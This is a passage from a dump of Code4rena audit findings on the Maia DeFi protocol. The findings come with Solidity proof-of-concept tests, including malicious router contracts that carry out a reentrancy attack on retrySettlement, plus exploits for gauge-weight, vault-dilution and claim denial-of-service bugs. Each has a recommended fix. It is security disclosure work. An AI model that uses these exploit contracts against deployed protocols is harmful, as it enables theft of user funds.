[BranchBridgeAgentExecutor.sol#L110](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgentExecutor.sol#L110). ```Solidity     function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {         //Update User Gas available.         if (initialGas == 0) {             userFeeInfo.depositedGas = uint128(msg.value);             userFeeInfo.gasToBridgeOut = _remoteExecutionGas;         }         //Clear Settlement with updated gas.         _retrySettlement(_settlementNonce);     } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252   ## Proof of Concept 1. First append the following malicious router contracts to `RootTest.t.sol`.  ```Solidity import {     SettlementParams } from \"@omni/interfaces/IBranchBridgeAgent.sol\";  contract AttackerBranchRouter is BaseBranchRouter {      uint256 counter;      function anyExecuteSettlement(bytes calldata data, SettlementParams memory sParams)         external         override         returns (bool success, bytes memory result)     {         // limit the recursive loop to re-enter 4 times (just for POC purpose)         if(counter++ == 4) return (true, \"\");          address rootBridgeAgentAddress =  address(uint160(bytes20(data[0:20])));          // Re-enter retrySettlement() before the first settlement is marked as executed         RootBridgeAgent rootBridgeAgent = RootBridgeAgent(payable(rootBridgeAgentAddress));         rootBridgeAgent.retrySettlement{value: 3e11 }(sParams.settlementNonce, 1e11);          // Top-up gas for BranchBridgeAgent as retrySettlement() will refund gas after each call         BranchBridgeAgent branchAgent = BranchBridgeAgent(payable(localBridgeAgentAddress));         WETH9 nativeToken = WETH9(branchAgent.wrappedNativeToken());         nativeToken.deposit{value: 1e11}();         nativeToken.transfer(address(branchAgent), 1e11);     }      fallback() external payable {} }  contract AttackerRouter is Test {      function reentrancyAttack(         RootBridgeAgent _rootBridgeAgent,          address owner,         address recipient,         address outputToken,         uint256 amountOut,         uint256 depositOut,         uint24 toChain     ) external payable {          // Approve Root Port to spend/send output hTokens.         ERC20hTokenRoot(outputToken).approve(address(_rootBridgeAgent), amountOut);          // Encode calldata to pass in rootBridgeAgent address and          // also to trigger exeuction of anyExecuteSettlement         bytes memory data = abi.encodePacked(address(_rootBridgeAgent));          // Initiate the first settlement         _rootBridgeAgent.callOutAndBridge{value: msg.value}(             owner, recipient, data, outputToken, amountOut, depositOut, toChain         );     } } ```  2. Then add and run following test case in the `RootTest` contract within `RootTest.t.sol`.  ```Solidity     function testPeakboltRetrySettlementReentrancy() public {         //Set up         testAddLocalTokenArbitrum();          address attacker = address(0x999);          // Attacker deploys RootBridgeAgent with malicious Routers          // Issue 1 - RootBridgeAgentFactory.createBridgeAgent() has no access control,          //           which allows anyone to create RootBridgeAgent and inject RootRouter and BranchRouter.         hevm.startPrank(attacker);         AttackerRouter attackerRouter = new AttackerRouter();         AttackerBranchRouter attackerBranchRouter = new AttackerBranchRouter();         RootBridgeAgent attackerBridgeAgent = RootBridgeAgent(             payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(attackerRouter)))         );         attackerBridgeAgent.approveBranchBridgeAgent(ftmChainId);         hevm.stopPrank();          //Get some gas.         hevm.deal(attacker, 0.1 ether);         hevm.deal(address(attackerBranchRouter), 0.1 ether);          // Add FTM branchBridgeAgent and inject the malicious BranchRouter          hevm.prank(attacker);         rootCoreRouter.addBranchToBridgeAgent{value: 1e12}(             address(attackerBridgeAgent),             address(ftmBranchBridgeAgentFactory),             address(attackerBranchRouter),             address(ftmCoreRouter),             ftmChainId,             5e11         );          // Initialize malicious BranchRouter with the created BranchBridgeAgent for FTM          BranchBridgeAgent attackerBranchBridgeAgent = BranchBridgeAgent(payable(attackerBridgeAgent.getBranchBridgeAgent(ftmChainId)));         hevm.prank(attacker);         attackerBranchRouter.initialize(address(attackerBranchBridgeAgent));           // Get some hTokens for attacker to create the first settlement         uint128 settlementAmount = 10 ether;         hevm.prank(address(rootPort));         ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(attacker, settlementAmount, rootChainId);          console2.log(\"STATE BEFORE:\");          // Attacker should have zero AvaxAssetLocalToken before bridging to FTM via the settlement         console2.log(\"Attacker newAvaxAssetLocalToken (FTM) Balance: \\t\", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));         require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 0);          // Attacker will start with 1e18 hTokens for the first settlement         console2.log(\"Attacker Global Balance: \\t\", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));         require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == settlementAmount);          // Expect next settlementNonce to be '1' before settlement creation         console2.log(\"attackerBridgeAgent.settlementNonce: %d\", attackerBridgeAgent.settlementNonce());         require(attackerBridgeAgent.settlementNonce() == 1);          // Execution history in BranchBridgeAgent is not marked yet         console2.log(\"attackerBranchBridgeAgent.executionHistory(1) = %s\", attackerBranchBridgeAgent.executionHistory(1));         console2.log(\"attackerBranchBridgeAgent.executionHistory(2) = %s\", attackerBranchBridgeAgent.executionHistory(2));           // Attacker transfers hTokens into router, triggers the first settlement and then the reentrancy attack         // Issue 2 - RootBridgeAgent.retrySettlement() has no lock to prevent reentrancy          //           We can re-enter retrySettlement() via the injected malicious BranchRouter (above)         //           Refer to AttackerRouter and AttackerBranchRouter contracts to see the reentrance calls         hevm.prank(attacker);         MockERC20(newAvaxAssetGlobalAddress).transfer(address(attackerRouter), settlementAmount);          hevm.prank(attacker);         attackerRouter.reentrancyAttack{value: 1e13 }(attackerBridgeAgent, attacker, attacker, address(newAvaxAssetGlobalAddress), settlementAmount,  0, ftmChainId);             console2.log(\"STATE AFTER:\");          // Attacker will now have 5e19 AvaxAssetLocalToken after using 1e19 and some gas to perform 4x recursive reentrancy attack         console2.log(\"Attacker newAvaxAssetLocalToken (FTM) Balance: \", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));         require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 5e19);          // The hTokens have been used for the first settlement         console2.log(\"Attacker Global Balance: \", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));         require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == 0);          // Expect next settlementNonce to be '2' as we only used '1' for the attacker         console2.log(\"attackerBridgeAgent.settlementNonce: %d\",  attackerBridgeAgent.settlementNonce());         require(attackerBridgeAgent.settlementNonce() == 2);          // This shows that only execution is marked for settlementNonce '1'          console2.log(\"attackerBranchBridgeAgent.executionHistory(1): %s\", attackerBranchBridgeAgent.executionHistory(1));         console2.log(\"attackerBranchBridgeAgent.executionHistory(2): %s\", attackerBranchBridgeAgent.executionHistory(2));          } ```  ## Recommended Mitigation Steps Add `lock` modifier to `RootBridgeAgent.retrySettlement()` and add access control to `RootBridgeAgentFactory.createBridgeAgent()`.    ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/491", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-20"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/0xn006e7-G.md)."}, {"title": "Removing more gauge weight than it should be while transfering ````ERC20Gauges```` token", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/477", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-21"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L536   # Vulnerability details  ## Impact The ````_decrementWeightUntilFree()```` function is not well implemented. If there are deprecated gauges, it would remove more gauge weight than it should be while transfering ````ERC20Gauges```` token.  ## Proof of Concept The issue arises on L536 of ````_decrementWeightUntilFree()````, where ````userFreed````, rather than ````totalFreed````, should be used in loop condition. ```diff File: src\\erc-20\\ERC20Gauges.sol 519:     function _decrementWeightUntilFree(address user, uint256 weight) internal nonReentrant { 520:         uint256 userFreeWeight = freeVotes(user) + userUnusedVotes(user); 521:  522:         // early return if already free 523:         if (userFreeWeight >= weight) return; 524:  525:         uint32 currentCycle = _getGaugeCycleEnd(); 526:  527:         // cache totals for batch updates 528:         uint112 userFreed; 529:         uint112 totalFreed; 530:  531:         // Loop through all user gauges, live and deprecated 532:         address[] memory gaugeList = _userGauges[user].values(); 533:  534:         // Free gauges through the entire list or until underweight 535:         uint256 size = gaugeList.length; -536:         for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight;) { +536:         for (uint256 i = 0; i < size && (userFreeWeight + userFreed) < weight;) { 537:             address gauge = gaugeList[i]; 538:             uint112 userGaugeWeight = getUserGaugeWeight[user][gauge]; 539:             if (userGaugeWeight != 0) { 540:                 // If the gauge is live (not deprecated), include its weight in the total to remove 541:                 if (!_deprecatedGauges.contains(gauge)) { 542:                     totalFreed += userGaugeWeight; 543:                 } 544:                 userFreed += userGaugeWeight; 545:                 _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle); 546:  547:                 unchecked { 548:                     i++; 549:                 } 550:             } 551:         } 552:  553:         getUserWeight[user] -= userFreed; 554:         _writeGaugeWeight(_totalWeight, _subtract112, totalFreed, currentCycle); 555:     } 556: } ``` The following test script shows how excess gauge weight is inadvertently removed during the transfer of ````ERC20Gauges```` tokens. ````FilePath: test\\erc-20\\ERC20GaugesBug.t.sol```` ```solidity // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0;  import {console2} from \"forge-std/console2.sol\";  import {DSTestPlus} from \"solmate/test/utils/DSTestPlus.sol\";  import {MockBaseV2Gauge, FlywheelGaugeRewards, ERC20} from \"../gauges/mocks/MockBaseV2Gauge.sol\";  import {MockERC20Gauges, ERC20Gauges} from \"./mocks/MockERC20Gauges.t.sol\";  contract ERC20GaugesTest is DSTestPlus {     MockERC20Gauges token;     address gauge1;     address gauge2;      function setUp() public {         token = new MockERC20Gauges(address(this), 3600, 600); // 1 hour cycles, 10 minute freeze          hevm.mockCall(address(0), abi.encodeWithSignature(\"rewardToken()\"), abi.encode(ERC20(address(0xDEAD))));         hevm.mockCall(address(0), abi.encodeWithSignature(\"gaugeToken()\"), abi.encode(ERC20Gauges(address(0xBEEF))));         hevm.mockCall(             address(this), abi.encodeWithSignature(\"bHermesBoostToken()\"), abi.encode(ERC20Gauges(address(0xBABE)))         );          gauge1 = address(new MockBaseV2Gauge(FlywheelGaugeRewards(address(0)), address(0), address(0)));         gauge2 = address(new MockBaseV2Gauge(FlywheelGaugeRewards(address(0)), address(0), address(0)));     }      function testRemovingMoreGaugeWeightThanItShouldBe() public {         // initializing         token.setMaxGauges(2);         token.addGauge(gauge1);         token.addGauge(gauge2);         token.setMaxDelegates(2);          // test users         address alice = address(0x111);         address bob = address(0x222);          // give some token to alice          token.mint(alice, 200);          // alice delegate votes to self         hevm.prank(alice);         token.delegate(alice);         assertEq(token.getVotes(alice), 200);          // alice increments gauge1 and gauge2 with weight 100 respectively         hevm.startPrank(alice);         token.incrementGauge(gauge1, 100);         token.incrementGauge(gauge2, 100);         hevm.stopPrank();         assertEq(token.getUserGaugeWeight(alice, gauge1), 100);         assertEq(token.getUserGaugeWeight(alice, gauge2), 100);         assertEq(token.getUserWeight(alice), 200);          // removing gauge1 would trigger the bug         token.removeGauge(gauge1);          // transfer only 100 weight         hevm.prank(alice);         token.transfer(bob, 100);          // but all 200 weight is removed, and the 100 weight of gauge2         // is removed unnecessarily         assertEq(token.getUserGaugeWeight(alice, gauge1), 0);         assertEq(token.getUserGaugeWeight(alice, gauge2), 0);         assertEq(token.getUserWeight(alice), 0);     }  } ```  Test log: ```solidity 2023-05-maia> forge test --match-test testRemovingMoreGaugeWeightThanExpected -vv [\u2818] Compiling... [\u2806] Compiling 87 files with 0.8.18 [\u2818] Solc 0.8.18 finished in 39.43s Compiler run successful  Running 1 test for test/erc-20/ERC20GaugesBug.t.sol:ERC20GaugesTest [PASS] testRemovingMoreGaugeWeightThanExpected() (gas: 649072) Test result: ok. 1 passed; 0 failed; finished in 2.64ms ```  ## Tools Used Manually review  ## Recommended Mitigation Steps See PoC   ## Assessed type  Other"}, {"title": "Maia Governance token balance dilution in `vMaia` vault is breaking the conversion rate mechanism", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/473", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-22"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L235-L246 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229   # Vulnerability details  ## Impact Once a user deposits `Maia` ERC-20 tokens into the `vMaia` ERC-4626 vault, he is eligible to claim 3 kinds of utility tokens, bHermes Weight & Governance and Maia Governance (pbHermes, partner governance). On each deposit, new Maia Governance tokens (pbHermes) are [minted to the vault in proportion to the deposited amount](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L235-L246), but those tokens are [never burned on withdrawal](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L248-L256). This naturally dilutes the vault's `pbHermes` token balance during the course of users depositing & withdrawing `Maia` tokens. Futhermore, a malicious user can dramatically accelerate this dilution by repeatedly depositing & withdrawing within a single transaction.   *Note that the vault's bHermes Weight & Governance token balances are not diluted during this process.*    However, the [ERC4626PartnerManager.increaseConversionRate(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229) method (`ERC4626PartnerManager` is base of `vMaia` contract) relies on the vault's `pbHermes` token balance and therefore imposes a lower limt on an increased pbHermes<>bHermes coversion rate to avoid underflow, see [L226](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L226): `min. rate = vault balance of pbHermes / Maia tokens in vault`. Meanwhile the upper limit for a new conversion rate is given by [L219](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L219): `max. rate = vault balance of bHermes / Maia tokens in vault`.    As a consquence, the `vMaia` vault owner's ability to increase the conversion rate is successively constrained by user deposits & withdrawals, until the point where the dilution of `pbHermes` reaches `vault balance of pbHermes > vault balance of bHermes` which leads to complete DoS of the [ERC4626PartnerManager.increaseConversionRate(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229) method.   ## Proof of Concept  The following PoC verifies the above claims about `pbHermes` dilution and `increaseConversionRate(...)` DoS, just apply the *diff* below and run the new in-line documented test case with `forge test -vv --match-test testDepositMaiaDilutionUntilConversionRateFailure`: ```diff diff --git a/test/maia/vMaiaTest.t.sol b/test/maia/vMaiaTest.t.sol index 6efabc5..2af982e 100644 --- a/test/maia/vMaiaTest.t.sol +++ b/test/maia/vMaiaTest.t.sol @@ -7,6 +7,7 @@ import {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";   import {vMaia, PartnerManagerFactory, ERC20} from \"@maia/vMaia.sol\";  import {IBaseVault} from \"@maia/interfaces/IBaseVault.sol\"; +import {IERC4626PartnerManager} from \"@maia/interfaces/IERC4626PartnerManager.sol\";  import {MockVault} from \"./mock/MockVault.t.sol\";   import {bHermes} from \"@hermes/bHermes.sol\"; @@ -47,7 +48,7 @@ contract vMaiaTest is DSTestPlus {              \"vMAIA\",              address(bhermes),              address(vault), -            address(0) +            address(this) // set owner to allow call to 'increaseConversionRate'          );      }  @@ -86,6 +87,39 @@ contract vMaiaTest is DSTestPlus {          assertEq(vmaia.balanceOf(address(this)), amount);      }  +    function testDepositMaiaDilutionUntilConversionRateFailure() public { +        testDepositMaia(); +        uint256 amount = vmaia.balanceOf(address(this)); + +        // fast-forward to withdrawal Tuesday +        hevm.warp(getFirstDayOfNextMonthUnix()); + +        for(uint256 i = 0; i < 10; i++) { +            // get & print bHermes & pbHermes vault balances +            uint256 bHermesBal = bhermes.balanceOf(address(vmaia)); +            uint256 pbHermesBal = vmaia.partnerGovernance().balanceOf(address(vmaia)); +            console2.log(\"vault balance of bHermes: \", bHermesBal); +            console2.log(\"vault balance of pbHermes:\", pbHermesBal); + +            // dilute pbHermes by withdraw & deposit cycle +            vmaia.withdraw(amount, address(this), address(this)); +            maia.approve(address(vmaia), amount); +            vmaia.deposit(amount, address(this)); + +            // get diluted pbHermes balance and compute min. conversion rate accordingly +            pbHermesBal = vmaia.partnerGovernance().balanceOf(address(vmaia)); +            uint256 minNewConversionRate = pbHermesBal / vmaia.totalSupply(); +            // check if dilution caused constraints are so bad that we get DoS +            if (pbHermesBal > bHermesBal) +            { +                hevm.expectRevert(IERC4626PartnerManager.InsufficientBacking.selector); +            } +            vmaia.increaseConversionRate(minNewConversionRate); +        } + + +    } +      function testDepositMaiaAmountFail() public {          assertEq(vmaia.bHermesRate(), bHermesRate);  ```  We can clearly see the increasing dilution after each withdrawal-deposit cycle and get the expected **revert**, see if-condition, after reaching critical dilution: ``` [PASS] testDepositMaiaDilutionUntilConversionRateFailure() (gas: 1759462) Logs:   2023 2   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 200000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 400000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 800000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 1600000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 2400000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 3200000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 4000000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 4800000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 5600000000000000000000 ```  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps  Burn the excess `pbHermes` tokens on withdrawal from `vMaia` vault: ```diff diff --git a/src/maia/tokens/ERC4626PartnerManager.sol b/src/maia/tokens/ERC4626PartnerManager.sol index b912bab..31cfef7 100644 --- a/src/maia/tokens/ERC4626PartnerManager.sol +++ b/src/maia/tokens/ERC4626PartnerManager.sol @@ -252,6 +252,7 @@ abstract contract ERC4626PartnerManager is PartnerUtilityManager, Ownable, ERC46       * @param amount amounts of vMaia to burn       */      function _burn(address from, uint256 amount) internal virtual override checkTransfer(from, amount) { +        ERC20MultiVotes(partnerGovernance).burn(address(this), amount * bHermesRate);          super._burn(from, amount);      }  ```  We can see that this fixes the dilution issue: ``` [PASS] testDepositMaiaDilutionUntilConversionRateFailure() (gas: 2150656) Logs:   2023 2   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000   vault balance of bHermes:  1000000000000000000000   vault balance of pbHermes: 100000000000000000000 ```    ## Assessed type  ERC20"}, {"title": "Claiming outstanding utility tokens from `vMaia` vault DoS on `pbHermes<>bHermes` conversion rate > 1", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/470", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-23"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/vMaia.sol#L66-L88   # Vulnerability details  ## Impact Once a user deposits `Maia` ERC-20 tokens into the `vMaia` ERC-4626 vault, he is eligible to claim 3 kinds of utility tokens, bHermes Weight & Governance and Maia Governance (pbHermes, partner governance), via the [ERC4626PartnerManager.claimOutstanding()](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L89-L97) method (`ERC4626PartnerManager` is base of `vMaia` contract).   The conversion rate between the utility tokens and [vMaia tokens minted on deposit](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L235-L246) can be increased (and **only** increased) by the contract owner via the [ERC4626PartnerManager.increaseConversionRate(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L215-L229) method.    However, the [checkWeight, checkGovernance & checkPartnerGovernance](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/vMaia.sol#L66-L88) modifiers in the `vMaia` contract do not account for this conversion rate and therefore implicity only allow a conversion rate of 1.    As a consequence, as soon as the conversion rate is increased to > 1, a call to [ERC4626PartnerManager.claimOutstanding()](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L89-L97) will inevitably revert due to subsequent calls to the above modifiers. Since the conversion rate can [only be increased](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L217) and the `vMaia` vault contract is not upgradeable, the `claimOutstanding()` method is subject to **permanent DoS**.   Of course, the user can still claim a reduced amount of utility tokens (according to a conversion rate of 1) via the [PartnerUtilityManager.claimMultipleAmounts(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/PartnerUtilityManager.sol#L115-L124) method (`PartnerUtilityManager` is base of `ERC4626PartnerManager` contract), but this still implies a loss of assets for the user since not all utility tokens he is eligible for can be claimed. Furthermore, this workaround doesn't help when the user is a contract which implemented a call to the `claimOutstanding()` method.  ## Proof of Concept  The following PoC demonstrates the above DoS when trying to claim the utility tokens with increased conversion rate, just apply the *diff* below and run the test cases with `forge test -vv --match-test testDepositMaia`: ```diff diff --git a/test/maia/vMaiaTest.t.sol b/test/maia/vMaiaTest.t.sol index 6efabc5..499abb6 100644 --- a/test/maia/vMaiaTest.t.sol +++ b/test/maia/vMaiaTest.t.sol @@ -7,9 +7,11 @@ import {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";   import {vMaia, PartnerManagerFactory, ERC20} from \"@maia/vMaia.sol\";  import {IBaseVault} from \"@maia/interfaces/IBaseVault.sol\"; +import {IERC4626PartnerManager} from \"@maia/interfaces/IERC4626PartnerManager.sol\";  import {MockVault} from \"./mock/MockVault.t.sol\";   import {bHermes} from \"@hermes/bHermes.sol\"; +import {IUtilityManager} from \"@hermes/interfaces/IUtilityManager.sol\";   import {DateTimeLib} from \"solady/utils/DateTimeLib.sol\";  @@ -47,7 +49,7 @@ contract vMaiaTest is DSTestPlus {              \"vMAIA\",              address(bhermes),              address(vault), -            address(0) +            address(this) // set owner to allow call to 'increaseConversionRate'          );      }  @@ -86,6 +88,33 @@ contract vMaiaTest is DSTestPlus {          assertEq(vmaia.balanceOf(address(this)), amount);      }  +    function testDepositMaiaClaimDoS() public { +        testDepositMaia(); + +        // increase 'pbHermes<>bHermes' conversion rate +        vmaia.increaseConversionRate(bHermesRate * 2); + +        // claim utility tokens DoS +        hevm.expectRevert(IUtilityManager.InsufficientShares.selector); +        vmaia.claimOutstanding(); + +        // cannot undo conversion rate -> claimOutstanding() method is broken forever +        hevm.expectRevert(IERC4626PartnerManager.InvalidRate.selector); +        vmaia.increaseConversionRate(bHermesRate); +    } + +    function testDepositMaiaClaimSuccess() public { +        testDepositMaia(); + +        vmaia.claimOutstanding(); + +        // got utility tokens as expected +        assertGt(vmaia.bHermesToken().gaugeWeight().balanceOf(address(this)), 0); +        assertGt(vmaia.bHermesToken().governance().balanceOf(address(this)), 0); +        assertGt(vmaia.partnerGovernance().balanceOf(address(this)), 0); +    } + +      function testDepositMaiaAmountFail() public {          assertEq(vmaia.bHermesRate(), bHermesRate);  ```  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps  Simply remove the incorrect [checkWeight, checkGovernance & checkPartnerGovernance](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/vMaia.sol#L66-L88) modifiers from the `vMaia` contract, since the [correct modifiers](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L293-L323), which account for the conversion rate, are already implemented in the `ERC4626PartnerManager` contract.  ```diff diff --git a/src/maia/vMaia.sol b/src/maia/vMaia.sol index 3aa70cf..5ee6f66 100644 --- a/src/maia/vMaia.sol +++ b/src/maia/vMaia.sol @@ -59,34 +59,6 @@ contract vMaia is ERC4626PartnerManager {          currentMonth = DateTimeLib.getMonth(block.timestamp);      }  -    /*/////////////////////////////////////////////////////////////// -                            MODIFIERS -    //////////////////////////////////////////////////////////////*/ - -    /// @dev Checks available weight allows for the call. -    modifier checkWeight(uint256 amount) virtual override { -        if (balanceOf[msg.sender] < amount + userClaimedWeight[msg.sender]) { -            revert InsufficientShares(); -        } -        _; -    } - -    /// @dev Checks available governance allows for the call. -    modifier checkGovernance(uint256 amount) virtual override { -        if (balanceOf[msg.sender] < amount + userClaimedGovernance[msg.sender]) { -            revert InsufficientShares(); -        } -        _; -    } - -    /// @dev Checks available partner governance allows for the call. -    modifier checkPartnerGovernance(uint256 amount) virtual override { -        if (balanceOf[msg.sender] < amount + userClaimedPartnerGovernance[msg.sender]) { -            revert InsufficientShares(); -        } -        _; -    } -      /// @dev Boost can't be claimed; does not fail. It is all used by the partner vault.      function claimBoost(uint256 amount) public override {}  ```    ## Assessed type  Invalid Validation"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/459", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Emmanuel-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/450", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-15"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/pfapostol-Analysis.md)."}, {"title": "Attacker can exploit \"deposit\" to drain Ulysess Liquidity Pool", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/435", "labels": ["bug", "3 (High Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-19"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesPool.sol#L942-L1019   # Vulnerability details  ## Impact Users have two methods to add liquidity to the Ulysses Pool: \"mint\" and \"deposit\". However, the latter may return an inaccurate output, which could be exploited to drain the pool.  ## Proof of Concept In the process to mint `amount` of share, the state change is `A:(band, supply\u00d7weight) -> B:(band+update, (supply+amount)\u00d7weight)`. User pays `amount-sum(posFee)+sum(negFee)` of underlying to acquire `amount` of share. This approach is precise.  In the process to deposit `amount` of underlying, the simulated state change is `A:(band, supply\u00d7weight) -> B:(band+update, (supply+amount)\u00d7weight)`. Then `(posFee, negFee)` is derived from the simulation of `A->B`. The actual state change is `A:(band, supply\u00d7weight) -> B':(band+update+posFee, (supply+amount+sum(posFee)-sum(negFee))\u00d7weight)`. We denote the actual fee of `A->B'` as `(posFee', negFee')`. User pays `amount` of underlying to acquire `amount+sum(posFee)-sum(negFee)` of share. This approach would be acceptable if `sum(pos')-sum(neg') >= sum(pos)`, but this inequality doesn't always hold. If `sum(pos')-sum(neg') < sum(pos)`, insolvency occurs; if `sum(pos')-sum(neg') < sum(pos)-sum(neg)`, user could take profit.  An example is given below: ``` amount = 10000000 supply = 1000000000000000013287555072 weight = [1, 59, 47] band = [99452334745147595191585509, 4253569467850027815346666, 216725069177793291903286517] ``` When Alice deposits `10000000` underlying, she will get `36215776` share. However, the pool actually worsens. ``` oldRebalancingFee = [0, 10519971631761767037843097, 18152377668510835770992] newRebalancingFee = [0, 10519971631761767000804564, 18152377668510882599904] oldMinusNew = [0, +37038533, -46828912] ``` Actually there should be a systemic approach to construct states of `sum(pos')-sum(neg') < sum(pos)-sum(neg)` for attacks. However, due to limited time, I have only conducted random tests. By continuously searching for profitable states and modifying the pool state accordingly, attackers can eventually drain the pool.  ## FAQ Here are several questions that readers may have:  Q: Why there are three diffrent scenarios? Why could insolvency and user loss happen simultaneously? A: Imagine when you deposit 